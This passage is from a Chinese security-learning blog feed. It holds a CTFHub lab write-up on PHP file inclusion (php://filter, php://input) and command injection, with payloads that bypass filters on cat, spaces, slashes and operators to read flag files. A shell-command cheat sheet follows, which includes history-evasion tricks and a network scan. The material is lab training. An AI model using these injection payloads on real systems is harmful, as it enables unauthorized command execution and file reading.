$_GET[&quot;file&quot;];&#125;</code></p><p>strpos函数是用于查找字符串中<code>第一次出现的位置</code>(区分大小写)，从0开始数</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="string">&quot;I love php, I love php too!&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码第一次出现”php“的位置是第7个位置。</p><p>作用是strpos($_GET[“file”], “flag”) {为真，<br>第一个flag在最前面返回0<br>第二个没有flag在参数，也返回空也可以当做0</p></blockquote><blockquote><p><code>!strpos($_GET[&quot;file&quot;],&quot;flag&quot;</code>当函数的第一个位置是flag或者没有flag字符串，返回的都是0</p><p>!0=1 为真 </p><p>!1=0 为假</p><p>判断为真，继续执行代码，</p><p>include，文件包含函数，</p></blockquote><p>2.查看phpinfo配置文件，发现能够使用php://input伪协议</p><p><img src="/2023/07/15/ctfhub/image-20230824105912655.png" alt="image-20230824105912655"></p><p>看到根目录底下有flag，cat看一下，得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230824110043408.png" alt="image-20230824110043408"></p><h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>1.打开题目，查看代码</p><p><img src="/2023/07/15/ctfhub/image-20230824110450032.png" alt="image-20230824110450032"></p><p>根上面几关的代码差不多，就不解释啦！</p><p>提示：<code>flag in &lt;code&gt;/flag&lt;/code&gt;</code></p><p>flag可能是根编码有关的，查找一下相关的伪协议</p><p>2.利用php://filter伪协议</p><p>php://filter是一种元封装器，设计用来数据流打开是的筛选过滤应用。目的是使用一下参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p><p>这道题可以利用base64编码回显数据</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=../../../flag</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824112610208.png" alt="image-20230824112610208"></p><p>用base64解码，就得到了flag</p><p><img src="/2023/07/15/ctfhub/image-20230824112553456.png" alt="image-20230824112553456"></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>1.题目提示这个是测试网络延迟的平台，路由器中经常出现。</p><p>打开题目后输入127.0.0.1 试试</p><blockquote><p><strong>一些linux中的命令的链接符号</strong></p><p><strong>1.每个命令之间用<code>;</code>隔开</strong></p><p>说明:各命令的执行结果，不会影响其它命令的执行。各个命令都会执行，但不保证每个命令都执行成功。</p><p><strong>2.每个命令之间用<code>&amp;&amp;</code>隔开</strong></p><p>说明：若前面的命令执行成功，才会去执行后面的命令。这样可以保证所有的命令执行完毕之后，执行过程都是成功的。</p><p><strong>3.每个命令之间用<code>||</code>隔开</strong></p><p>说明：||是或的意思，只有前面的命令执行失败后才会去执行下一条命令，直到执行成功一条命令为止。</p><p><strong>4.<code>|</code>是管道符号。</strong></p><p>管道符号改变标准输入的源或者是标准输出的目的地。</p><p><strong>5.&amp;是后台任务符号。</strong></p><p>后台任务符号使shell在后台执行该任务使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。</p></blockquote><p>使用&amp;连接符，连接别命令试一下，发现也执行了后面的命令，且文件夹下有一个php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824153431399.png" alt="image-20230824153431399"></p><p><strong><code>发现有一个php文件，因为php文件内容无法直接显示在网页页面中，所以需要对php内容进行编码后打印回显</code></strong></p><p><img src="/2023/07/15/ctfhub/image-20230824154334627.png" alt="image-20230824154334627"></p><p><strong><code>那我们试试用管道符号| base64，对我们目标php文件进行base64编码后输出结果</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; cat 6932191568726.php | base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824155139642.png" alt="image-20230824155139642"></p><p>解码得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230824160651731.png" alt="image-20230824160651731"></p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><p>打开题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824161634834.png" alt="image-20230824161634834"></p><p>发现有一个flag_119802432633.php文件</p><p>我们试试用cat</p><p><img src="/2023/07/15/ctfhub/image-20230824161834148.png" alt="image-20230824161834148"></p><p>好像cat被过滤了，题目也说了，我们试试找找能代替cat的命令</p><p>想到一个tac，试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; tac  flag_119802432633.php | base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824163309829.png" alt="image-20230824163309829"></p><p><img src="/2023/07/15/ctfhub/image-20230824163345388.png" alt="image-20230824163345388"></p><p>解码后得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230824163408013.png" alt="image-20230824163408013"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><p>老办法，查看一下根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824210639851.png" alt="image-20230824210639851"></p><p>发现有一个flag_21481267449426.php</p><p>题目的考点是过滤空格，所以我们就想，有什么可以代替空格的</p><p><code>&lt;来代替空格</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat&lt;flag|base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824211528703.png" alt="image-20230824211528703"></p><p><img src="/2023/07/15/ctfhub/image-20230824211604506.png" alt="image-20230824211604506"></p><p>在base64解码，得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230824211640790.png" alt="image-20230824211640790"></p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><p>打开题目，试试上面的方法，显示flag_is_here，我们cd 进去看看，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824212802621.png" alt="image-20230824212802621"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824214715949.png" alt="image-20230824214715949"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat  flag_225492447926722.php|base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824214825400.png" alt="image-20230824214825400"></p><p>解码base64，得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230824214913675.png" alt="image-20230824214913675"></p><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><p>那尝试用分隔符，发现可以用<code>;</code>隔开</p><p><img src="/2023/07/15/ctfhub/image-20230824220145065.png" alt="image-20230824220145065"></p><p>我们看到了flag_26423133555971,但是看一下网站源码，发现过滤了<code>|</code>管道符号</p><p>所以我们不能像前面的题把base64编码用管道符号连接</p><p><img src="/2023/07/15/ctfhub/image-20230824224431417.png" alt="image-20230824224431417"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag_26423133555971.php</span><br></pre></td></tr></table></figure><p>base64在前面也能够编码，使得php文件在页面上显示出来</p><p><img src="/2023/07/15/ctfhub/image-20230824222055713.png" alt="image-20230824222055713"></p><p>将base64解码，得到</p><p><img src="/2023/07/15/ctfhub/image-20230824222246300.png" alt="image-20230824222246300"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>打开题目，查看网站源代码</p><p><img src="/2023/07/15/ctfhub/image-20230824230910180.png" alt="image-20230824230910180"></p><p>发现过滤了好多，我们一个个看能用什么替换</p><p>看到<code>|，;，&amp;，cat，flag，ctfhub，空格</code>都被过滤了</p><blockquote><p><strong>空格</strong>可以用${IFS}</p><p><strong>cat</strong>可以用more     </p><p><strong>flag</strong>可以用正则f***</p><p><strong>ctfhub</strong>应该用不到 查了一下</p><p>在linux下，命令分隔符除了<code>;</code>还有**%0a**</p><p>有了<code>；</code>就可以不用运算符了</p><p><code>这里因为%0a是url编码，所以要输入到url中，否则会被二次编码</code></p></blockquote><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=127.0.0.1%0als#</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825214609075.png" alt="image-20230825214609075"></p><p>查看flag_is_here</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd$&#123;IFS&#125;fla*_is_here%0als</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825222324636.png" alt="image-20230825222324636"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0acd$&#123;IFS&#125;fla*_is_here%0abase64$&#123;IFS&#125;fla*_12606277463325.php#</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825222040376.png" alt="image-20230825222040376"></p><p>将base64解码</p><p><img src="/2023/07/15/ctfhub/image-20230825223603877.png" alt="image-20230825223603877"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell常用命令</title>
      <link href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="shell常用命令"><a href="#shell常用命令" class="headerlink" title="shell常用命令"></a>shell常用命令</h1><p><strong>前言</strong></p><p>使用Linux  shell是一些程序员每天的基本工作，但我们经常会忘记一些有用的shell命令和技巧。当然，命令我能记住，但我不敢说能记得如何用它执行某个特定任务。需要注意一点的是，有些用法需要在你的Linux系统里安装额外的软件。下面话不多说了，来看看详细的内容吧。</p><p><strong>检查远程端口是否对bash开放：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot;</span><br></pre></td></tr></table></figure><p><strong>让进程转入后台：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + z</span><br></pre></td></tr></table></figure><p><strong>产生随机的十六进制数，其中n是字符数：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rand -hex n</span><br></pre></td></tr></table></figure><p><strong>在当前shell里执行一个文件里的命令：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/user/file.name</span><br></pre></td></tr></table></figure><p><strong>截取前5个字符：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;variable:0:5&#125;</span><br></pre></td></tr></table></figure><p><strong>SSH debug 模式:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -vvv user@ip_address</span><br></pre></td></tr></table></figure><p><strong>SSH with pem key:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip_address -i key.pem</span><br></pre></td></tr></table></figure><p><strong>用wget抓取完整的网站目录结构，存放到本地目录中：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs</span><br></pre></td></tr></table></figure><p><strong>一次创建多个目录：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/user/&#123;test,test1,test2&#125;</span><br></pre></td></tr></table></figure><p><strong>列出包括子进程的进程树：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps axwef</span><br></pre></td></tr></table></figure><p><strong>创建 war 文件:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf name.war file</span><br></pre></td></tr></table></figure><p><strong>测试硬盘写入速度：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img</span><br></pre></td></tr></table></figure><p><strong>测试硬盘读取速度：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdparm -Tt /dev/sda</span><br></pre></td></tr></table></figure><p><strong>获取文本的md5 hash：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;text&quot; | md5sum</span><br></pre></td></tr></table></figure><p><strong>检查xml格式：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmllint --noout file.xml</span><br></pre></td></tr></table></figure><p><strong>将tar.gz提取到新目录里：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf package.tar.gz -C new_dir</span><br></pre></td></tr></table></figure><p><strong>使用curl获取HTTP头信息：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://www.example.com</span><br></pre></td></tr></table></figure><p><strong>修改文件或目录的时间戳(YYMMDDhhmm):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t 0712250000 file</span><br></pre></td></tr></table></figure><p><strong>用wget命令执行ftp下载：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -m ftp://username:password@hostname</span><br></pre></td></tr></table></figure><p><strong>生成随机密码(例子里是16个字符长):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c$&#123;1:-16&#125;;echo;</span><br></pre></td></tr></table></figure><p><strong>快速备份一个文件：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp some_file_name&#123;,.bkp&#125;</span><br></pre></td></tr></table></figure><p><strong>访问Windows共享目录：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &quot;DOMAIN\user&quot; //dc.domain.com/share/test/dir</span><br></pre></td></tr></table></figure><p><strong>执行历史记录里的命令(这里是第100行):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!100</span><br></pre></td></tr></table></figure><p><strong>解压:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip package_name.zip -d dir_name</span><br></pre></td></tr></table></figure><p><strong>输入多行文字(CTRL + d 退出):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; test.txt</span><br></pre></td></tr></table></figure><p><strong>创建空文件或清空一个现有文件：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&gt; test.txt</span><br></pre></td></tr></table></figure><p><strong>与Ubuntu NTP server同步时间：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate ntp.ubuntu.com</span><br></pre></td></tr></table></figure><p><strong>用netstat显示所有tcp4监听端口：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnt4 | awk &#x27;&#123;print $4&#125;&#x27; | cut -f2 -d: | grep -o &#x27;[0-9]*&#x27;</span><br></pre></td></tr></table></figure><p><strong>qcow2镜像文件转换：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \precise-server-cloudimg-amd64-disk1.raw</span><br></pre></td></tr></table></figure><p><strong>重复运行文件，显示其输出（缺省是2秒一次）：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch ps -ef</span><br></pre></td></tr></table></figure><p><strong>所有用户列表：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getent passwd</span><br></pre></td></tr></table></figure><p><strong>Mount root in read/write mode:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount,rw /</span><br></pre></td></tr></table></figure><p><strong>挂载一个目录（这是不能使用链接的情况）:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount --bind /source /destination</span><br></pre></td></tr></table></figure><p><strong>动态更新DNS server:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF</span><br></pre></td></tr></table></figure><p><strong>递归grep所有目录：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;some_text&quot; /path/to/dir</span><br></pre></td></tr></table></figure><p><strong>列出前10个最大的文件：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof / | awk &#x27;&#123; if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 &#125;&#x27; | sort -n -u | tail</span><br></pre></td></tr></table></figure><p><strong>显示剩余内存(MB):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -m | grep cache | awk &#x27;/[0-9]/&#123; print $4&quot; MB&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure><p><strong>打开Vim并跳到文件末：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim + some_file_name</span><br></pre></td></tr></table></figure><p><strong>Git 克隆指定分支(master):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:name/app.git -b master</span><br></pre></td></tr></table></figure><p><strong>Git 切换到其它分支(develop):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br></pre></td></tr></table></figure><p><strong>Git 删除分支(myfeature):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:name/app.git -b master</span><br></pre></td></tr></table></figure><p><strong>Git 切换到其它分支(develop):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br></pre></td></tr></table></figure><p><strong>Git 删除分支(myfeature):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d myfeature</span><br></pre></td></tr></table></figure><p><strong>Git 删除远程分支</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin :branchName</span><br></pre></td></tr></table></figure><p><strong>Git 将新分支推送到远程服务器：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin mynewfeature</span><br></pre></td></tr></table></figure><p><strong>打印历史记录中最后一次cat命令：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!cat:p</span><br></pre></td></tr></table></figure><p><strong>运行历史记录里最后一次cat命令：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!cat</span><br></pre></td></tr></table></figure><p><strong>找出/home/user下所有空子目录:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/user -maxdepth 1 -type d -empty</span><br></pre></td></tr></table></figure><p><strong>获取test.txt文件中第50-60行内容：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; test.txt sed -n &#x27;50,60p&#x27;</span><br></pre></td></tr></table></figure><p><strong>运行最后一个命令(如果最后一个命令是mkdir /root/test, 下面将会运行: sudo mkdir /root/test)：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo !!</span><br></pre></td></tr></table></figure><p><strong>创建临时RAM文件系统 – ramdisk (先创建/tmpram目录):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t tmpfs tmpfs /tmpram -o size=512m</span><br></pre></td></tr></table></figure><p><strong>Grep whole words:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -w &quot;name&quot; test.txt</span><br></pre></td></tr></table></figure><p><strong>在需要提升权限的情况下往一个文件里追加文本：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;some text&quot; | sudo tee -a /path/file</span><br></pre></td></tr></table></figure><p><strong>列出所有kill signal参数:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -l</span><br></pre></td></tr></table></figure><p><strong>在bash历史记录里禁止记录最后一次会话：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $$</span><br></pre></td></tr></table></figure><p><strong>扫描网络寻找开放的端口：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 8081 172.20.0.0/16</span><br></pre></td></tr></table></figure><p><strong>设置git email:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --globaluser.email &quot;me@example.com&quot; </span><br></pre></td></tr></table></figure><p><strong>To sync with master if you have unpublished commits:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p><strong>将所有文件名中含有”txt”的文件移入/home/user目录:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -iname &quot;*txt*&quot; -exec mv -v &#123;&#125; /home/user \;</span><br></pre></td></tr></table></figure><p><strong>将文件按行并列显示：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste test.txt test1.txt</span><br></pre></td></tr></table></figure><p><strong>shell里的进度条:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pv data.log</span><br></pre></td></tr></table></figure><p><strong>使用netcat将数据发送到Graphite server:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000</span><br></pre></td></tr></table></figure><p><strong>将tabs转换成空格：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expand test.txt &gt; test1.txt</span><br></pre></td></tr></table></figure><p><strong>Skip bash history:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; space &gt;cmd</span><br></pre></td></tr></table></figure><p><strong>去之前的工作目录：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd -</span><br></pre></td></tr></table></figure><p><strong>拆分大体积的tar.gz文件(每个100MB)，然后合并回去：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">split –b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive</span><br></pre></td></tr></table></figure><p><strong>使用curl获取HTTP status code:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL -w &quot;%&#123;http_code&#125;\\n&quot; www.example.com -o /dev/null</span><br></pre></td></tr></table></figure><p><strong>设置root密码，强化MySQL安全安装:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/mysql_secure_installation</span><br></pre></td></tr></table></figure><p><strong>当Ctrl + c不好使时:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + \</span><br></pre></td></tr></table></figure><p><strong>获取文件owner:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat -c %U file.txt</span><br></pre></td></tr></table></figure><p><strong>block设备列表：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk -f</span><br></pre></td></tr></table></figure><p><strong>找出文件名结尾有空格的文件：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -exec egrep -l &quot; +$&quot; &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>找出文件名有tab缩进符的文件</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -exec egrep -l $&#x27;\t&#x27; &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>用”=”打印出横线:全选复制放进笔记</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;%100s\n&#x27; | tr &#x27; &#x27; =</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场</title>
      <link href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
